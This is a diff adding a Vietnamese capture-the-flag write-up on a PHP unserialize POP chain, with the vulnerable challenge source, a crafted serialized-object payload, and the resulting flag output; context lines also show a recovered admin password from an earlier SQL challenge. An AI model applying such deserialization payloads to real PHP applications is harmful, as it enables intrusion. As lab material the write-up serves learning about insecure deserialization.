@@ -363,4 +363,65 @@ Table: users
 | admin    | T!m3B@s3DSQL! |
 +----------+---------------+
 ```
-## 73. XPath injection - Blind
+## 71. 	PHP - Unserialize Pop Chain
+- Đầu tiên xem source code
+```js
+$getflag = false;
+ 
+class GetMessage {
+    function __construct($receive) {
+        if ($receive === "HelloBooooooy") {
+            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
+        } else {
+            $this->receive = $receive;
+        }
+    }
+ 
+    function __toString() {
+        return $this->receive;
+    }
+ 
+    function __destruct() {
+        global $getflag;
+        if ($this->receive !== "HelloBooooooy") {
+            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
+        } else {
+            if ($getflag) {
+                include("flag.php");
+                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
+            }
+        }
+    }
+}
+ 
+class WakyWaky {
+    function __wakeup() {
+        echo "[YOU]: ".$this->msg."<br>";
+    }
+ 
+    function __toString() {
+        global $getflag;
+        $getflag = true;
+        return (new GetMessage($this->msg))->receive;
+    }
+}
+ 
+```
+- Đầu tiên là hàm unserialize chỉ call hàm __toString và __destruct không gọi hàm __construct. Vậy chỉ cần chuyển thuộc tính receive "HelloBooooooy" là có thể bypass được. Thêm một thuộc tính waky cho GetMessage để khởi tạo cho WakyWaky.
+- Bây giờ xử lý $getflag = true là thành công.
+- Khi khởi tạo WakyWaky thì __wakeup luôn được gọi và __toString xảy ra khi echo đối tượng đó vì thế mà $this->msg phải là class WakyWaky.
+- Tạo payoad:
+```js
+$getMes = new GetMessage("HelloBoooooo");
+$getMes->waky = new WakyWaky();
+$getMes->waky->msg = new WakyWaky();
+$test = serialize($getMes);
+=> 
+O:10:"GetMessage":2:{s:7:"receive";s:13:"HelloBooooooy";s:4:"waky";O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":0:{}}}
+```
+- Điền vào nộp là thành công.
+```js
+[YOU]:
+[FRIEND]: Hm.. you don't see to be the friend I was waiting for..
+[FRIEND]: Oh ! Hi! Let me show you my secret: uns3r14liz3_p0p_ch41n_r0cks
+```
